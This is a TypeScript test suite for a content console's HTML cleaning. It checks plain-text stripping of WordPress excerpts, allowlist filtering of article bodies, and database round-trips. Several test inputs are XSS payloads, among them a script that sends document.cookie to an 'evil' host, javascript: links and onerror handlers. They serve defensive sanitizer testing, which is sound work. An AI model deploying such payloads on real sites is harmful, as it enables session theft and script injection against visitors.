/**
 * Nothing the console writes reaches a person as markup by accident.
 *
 * The rule the whole suite protects is one sentence: **a field is stored in the format the
 * site prints it in.** A title, an excerpt or an `alt` is printed as text — inside a card, a
 * `<title>`, a `srcset` — so a `<p>` that survives into those columns is a `<p>` an operator
 * reads on screen and a crawler reads in the SERP. The WordPress import left exactly that in
 * 92 of the 94 article excerpts, and the console's own preview escaped it faithfully, which
 * is how it became visible.
 *
 * Four properties, checked at the door each one is really kept at:
 *
 * **The format decides the cleaning, in both directions.** `plain` is stripped on the way in
 * (`parseWrites`) and on the way out (`readStored`), because a row only gets rewritten when
 * someone edits it and the site cannot wait for that. `html` keeps its tags and is filtered
 * by the shared allowlist before the INSERT, so the database never holds a `<script>` at all.
 * `source` — the homepage's page-builder document — is stored verbatim and filtered only at
 * render, because `hero.ts` still reads `rs-slide` out of it.
 *
 * **The save path and the render path cannot drift.** Both read their tags and attributes
 * from `rich.ts`, so the copy that passes the save is the copy that reaches a visitor.
 *
 * **Cleaning is conservative.** `12 < 15` and `<3` are sentences, not tags, and `&amp;#8217;`
 * is an author writing about an entity — one decode pass, or their words become a quote mark.
 *
 * **The browser and the server agree.** `storedValue()` runs the same `plainText()` the write
 * does, so the box a person leaves shows what the column now holds.
 */
import { randomUUID } from 'node:crypto';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { db, destroyDb } from '../src/lib/db';
import { assertTestDb } from '../src/lib/db/guard';
import { decodeEntities, hasMarkup, plainText, readStored } from '../src/lib/content/format';
import { RICH_ALLOWED_TAGS } from '../src/lib/content/rich-policy';
import { sanitizeRichHtml } from '../src/lib/content/rich';
import { kindSpec, parseWrites } from '../src/lib/content/kinds';
import { createRow, getRow, saveDraft } from '../src/lib/content/store';
import { publicRow, type PublicValue } from '../src/lib/content/published';
import { publishRow } from '../src/lib/content/publish';
import { sanitizeHtmlBody } from '../src/lib/wp/sanitize';
import { displayForm, storedValue, type Form } from '../src/lib/console/editor-form';
import type { ContentRow, FieldView } from '../src/lib/content/store';

const run = randomUUID().slice(0, 8);
const slug = (name: string): string => `html-${run}-${name}`;
const actor = { id: randomUUID(), email: `html-${run}@example.test` };
const created: string[] = [];

/** WordPress's own shape for a teaser: a paragraph, an entity, and a stray tag. */
const DIRTY_EXCERPT = '<p>Discover Long-Lasting Beauty &mdash; you&#8217;ve seen &lt;p&gt; before</p>';

async function makeArticle(name: string): Promise<string> {
  const createdRow = await createRow('article', { key: slug(name), actorId: actor.id });
  if (!createdRow.ok) throw new Error(`create ${name}: ${createdRow.status} ${createdRow.code}`);
  created.push(createdRow.value.id);
  return createdRow.value.id;
}

/** Read a column exactly as MariaDB holds it, bypassing every read-path cleanup. */
async function column(id: string, name: string): Promise<string> {
  const found = await (db.selectFrom('articles') as unknown as {
    select(column: string): { where(column: string, op: string, value: unknown): { executeTakeFirst(): Promise<Record<string, unknown> | undefined> } };
  })
    .select(name)
    .where('id', '=', id)
    .executeTakeFirst();
  return String(found?.[name] ?? '');
}

/** The published value of a bilingual field, or empty text when the field is not a pair. */
function pair(value: PublicValue | undefined): { ar: string; en: string } {
  return value?.kind === 'bi' ? { ar: value.ar, en: value.en } : { ar: '', en: '' };
}

describe('a plain field is a sentence, not a document', () => {
  it('drops tags, decodes entities and folds the whitespace WordPress left behind', () => {
    expect(plainText(DIRTY_EXCERPT)).toBe('Discover Long-Lasting Beauty — you’ve seen before');
    expect(plainText('  multiple   spaces\nand\ttabs ')).toBe('multiple spaces and tabs');
  });

  it('leaves the comparisons and the emoji that only look like tags', () => {
    expect(plainText('a 12 < 15 and 3 > 1')).toBe('a 12 < 15 and 3 > 1');
    expect(plainText('a <3 heart')).toBe('a <3 heart');
    // An unclosed `<` cannot swallow the rest of the sentence, because a tag token ends.
    expect(plainText('if (x < y) { return }')).toBe('if (x < y) { return }');
  });

  it('removes an element whose contents are code, not prose', () => {
    expect(plainText('before <script>fetch("https://evil/steal?c="+document.cookie)</script> after')).toBe('before after');
    expect(plainText('style <style>body{display:none}</style> gone')).toBe('style gone');
  });

  it('settles: cleaning the same value twice changes it no further', () => {
    // The cleaner runs on both doors, so an answer that moved under its own next pass would
    // make the console disagree with the column and shorten the row on every read.
    for (const input of [DIRTY_EXCERPT, '&amp;#8217;', '<p>x</p>', 'a < b', '&lt;b&gt;', 'Tom &amp; Jerry', '']) {
      expect(plainText(plainText(input))).toBe(plainText(input));
    }
    expect(plainText('Tom &amp; Jerry')).toBe('Tom & Jerry');
    // An author typing *about* an entity or a tag is the cost of that fixed point.
    expect(decodeEntities('&amp;#8217;')).toBe('&#8217;');
    expect(plainText('&amp;#8217;')).toBe('’');
    expect(plainText('&lt;p&gt;')).toBe('');
    expect(plainText('&nbsp;&mdash;&hellip;')).toBe('—…');
  });

  it('knows markup when it sees it, twice in a row', () => {
    expect(hasMarkup('<p>hi</p>')).toBe(true);
    expect(hasMarkup('<!-- a comment -->')).toBe(true);
    expect(hasMarkup('12 < 15')).toBe(false);
    // `test()` on a `/g` regex remembers `lastIndex`; the same value must not alternate.
    expect([hasMarkup('<p>x</p>'), hasMarkup('<p>x</p>'), hasMarkup('<p>x</p>')]).toEqual([true, true, true]);
  });
});

describe('the format on the field decides what the column stores', () => {
  const article = kindSpec('article');

  it('cleans a plain bilingual column on the way in', () => {
    const parsed = parseWrites(article, { key: 'k', fields: { excerpt: DIRTY_EXCERPT } }, 'en');
    expect(parsed.issues).toEqual([]);
    expect(parsed.columns.excerpt_en).toBe('Discover Long-Lasting Beauty — you’ve seen before');
    expect(parsed.htmlColumns).toEqual([]);
  });

  it('names a body column so the caller filters it, and hands the homepage document over untouched', () => {
    const body = parseWrites(article, { key: 'k', fields: { content: '<h2>a</h2><script>x</script>' } }, 'en');
    expect(body.htmlColumns).toEqual(['content_en']);
    expect(body.columns.content_en).toContain('<script>');

    const page = parseWrites(kindSpec('page'), { key: 'k', fields: { content: '<div class="vc_row" data-thumb="a.jpg">x</div>' } }, 'en');
    expect(page.htmlColumns).toEqual([]);
    // The hero slider's own attributes survive the write: filtering here would delete the
    // homepage the first time anyone saved the page row.
    expect(page.columns.content_en).toContain('data-thumb="a.jpg"');
  });

  it('refuses a value that is still too long after it has been cleaned', () => {
    // The length is measured on what the column would actually hold, not on what was typed:
    // the `<p>` WordPress wrapped the teaser in is not content an editor has room for.
    const parsed = parseWrites(article, { key: 'k', fields: { title: `<p>${'a'.repeat(500)}</p>` } }, 'en');
    expect(parsed.issues).toEqual([]);
    expect(parsed.columns.title_en).toHaveLength(500);
    expect(parseWrites(article, { key: 'k', fields: { title: `<p>${'a'.repeat(501)}</p>` } }, 'en').issues).toEqual([
      { path: 'title', message: 'longer than 500 characters' },
    ]);
  });
});

describe('the allowlist is the same on the way in and on the way out', () => {
  it('keeps prose and drops every way a string can become code', () => {
    const stored = sanitizeRichHtml(
      '<h2>Heading</h2><p class="wp-block-paragraph">Text <strong>bold</strong></p>' +
        '<a href="javascript:alert(1)" target="_blank">link</a>' +
        '<img src="/wp/a.jpg" alt="A" onerror="fetch(1)">' +
        '<script>alert(1)</script><div onclick="steal()">x</div><iframe src="https://evil"></iframe>',
    );
    expect(stored).toContain('<h2>Heading</h2>');
    expect(stored).toContain('<p class="wp-block-paragraph">Text <strong>bold</strong></p>');
    expect(stored).not.toContain('javascript:');
    expect(stored).not.toMatch(/on(error|click|load)=/);
    expect(stored).not.toContain('<script');
    expect(stored).not.toContain('<iframe');
    expect(stored).toContain('rel="noopener noreferrer"');
    expect(stored).toContain('<img src="/wp/a.jpg" alt="A"');
  });

  it('is the list the render path filters with, so a saved body still survives the trip out', () => {
    for (const tag of ['p', 'h2', 'ul', 'li', 'blockquote', 'a', 'img', 'figure', 'table', 'figcaption']) {
      expect(RICH_ALLOWED_TAGS).toContain(tag);
    }
    // Whatever the save leaves standing, the render keeps standing too.
    const saved = sanitizeRichHtml('<figure><figcaption>Before</figcaption><img src="/a.jpg" alt="A"></figure>');
    expect(sanitizeHtmlBody(saved)).toBe(sanitizeHtmlBody(sanitizeHtmlBody(saved)));
    expect(sanitizeHtmlBody(saved)).toContain('<figcaption>');
  });

  it('gives the site no more than it gives the console', () => {
    const hostile = '<p>hi</p><script>alert(1)</script><img src="/a.jpg" onerror="alert(1)">';
    expect(sanitizeHtmlBody(hostile)).not.toMatch(/<script|onerror=/);
    expect(sanitizeHtmlBody(hostile)).toContain('<p>hi</p>');
  });
});

describe('a stored row reads back clean through both doors', () => {
  beforeAll(() => assertTestDb());

  afterAll(async () => {
    if (created.length > 0) await db.deleteFrom('articles').where('id', 'in', created).execute();
    await destroyDb();
  });

  it('writes the cleaned plain value and the filtered body into the columns themselves', async () => {
    const id = await makeArticle('save');
    const saved = await saveDraft('article', {
      id,
      locale: 'en',
      actorId: actor.id,
      fields: { title: '<h1>New Offer</h1>', excerpt: DIRTY_EXCERPT, content: '<p>Real prose</p><script>steal()</script><img src="/a.jpg" onerror="x">' },
    });
    expect(saved.ok).toBe(true);

    expect(await column(id, 'title_en')).toBe('New Offer');
    expect(await column(id, 'excerpt_en')).toBe('Discover Long-Lasting Beauty — you’ve seen before');
    const body = await column(id, 'content_en');
    expect(body).toContain('<p>Real prose</p>');
    expect(body).not.toContain('steal');
    expect(body).not.toMatch(/onerror=/);

    const row = await getRow('article', id);
    expect(row?.fields.excerpt?.draft?.en).toBe('Discover Long-Lasting Beauty — you’ve seen before');
  });

  it('prints an imported row it has never rewritten without its markup', async () => {
    // What the WordPress import left behind, written straight to the columns so no save
    // path gets the credit for cleaning it.
    const id = await makeArticle('imported');
    await db
      .updateTable('articles')
      .set({ title_en: '<p>Laser Hair Removal</p>', excerpt_en: DIRTY_EXCERPT, status: 'published', pub_title_en: '<p>Laser Hair Removal</p>', pub_excerpt_en: DIRTY_EXCERPT } as never)
      .where('id', '=', id)
      .execute();

    const row = await getRow('article', id);
    expect(row?.fields.title?.draft?.en).toBe('Laser Hair Removal');
    expect(row?.fields.excerpt?.draft?.en).toBe('Discover Long-Lasting Beauty — you’ve seen before');
    // The row is not marked pending on the difference between the two spellings of one
    // sentence: both sides of the comparison are read the same way.
    expect(row?.pendingLocales).toEqual([]);

    const live = await publicRow('article', slug('imported'));
    expect(live?.values.title).toEqual({ kind: 'bi', ar: '', en: 'Laser Hair Removal' });
    expect(pair(live?.values.excerpt).en).not.toContain('<p>');
    expect(pair(live?.values.excerpt).en).not.toContain('&#8217;');
  });

  it('publishes the draft the console holds, so the site never sees the markup first', async () => {
    const id = await makeArticle('publish');
    await saveDraft('article', { id, locale: 'ar', actorId: actor.id, fields: { excerpt: DIRTY_EXCERPT } });
    const done = await publishRow('article', { id, locales: ['ar'], actor });
    expect(done.ok).toBe(true);

    const live = await publicRow('article', slug('publish'));
    expect(pair(live?.values.excerpt).ar).toBe('Discover Long-Lasting Beauty — you’ve seen before');
    expect(pair(live?.values.excerpt).en).toBe('');
  });
});

describe('the editor shows the words the column will hold', () => {
  const plain = { kind: 'bi', format: 'plain', multiline: true } as unknown as FieldView;
  const body = { kind: 'bi', format: 'html', multiline: true } as unknown as FieldView;

  it('cleans a plain value and leaves a body exactly as authored', () => {
    expect(storedValue(plain, DIRTY_EXCERPT)).toBe('Discover Long-Lasting Beauty — you’ve seen before');
    expect(storedValue(body, '<p class="x">Keep <em>this</em></p>')).toBe('<p class="x">Keep <em>this</em></p>');
  });

  it('has the preview read the cleaned copy, not the raw keystrokes', () => {
    const row: ContentRow = {
      id: 'r',
      kind: 'article',
      key: 'k',
      listKey: null,
      status: 'draft',
      version: 1,
      trashed: false,
      updatedAt: '',
      publishedAt: null,
      pendingLocales: [],
      fields: { title: plain, content: body },
    };
    const form: Form = { title: DIRTY_EXCERPT, content: '<p><script>no()</script></p>' };
    const shown = displayForm(row, form);
    expect(shown.title).toBe('Discover Long-Lasting Beauty — you’ve seen before');
    expect(shown.content).toBe('<p><script>no()</script></p>');
    // The box the person is typing in is not rewritten under them; only the copy that
    // leaves the pane is.
    expect(form.title).toBe(DIRTY_EXCERPT);
    expect(readStored('html', '<p>a</p>')).toBe('<p>a</p>');
  });
});
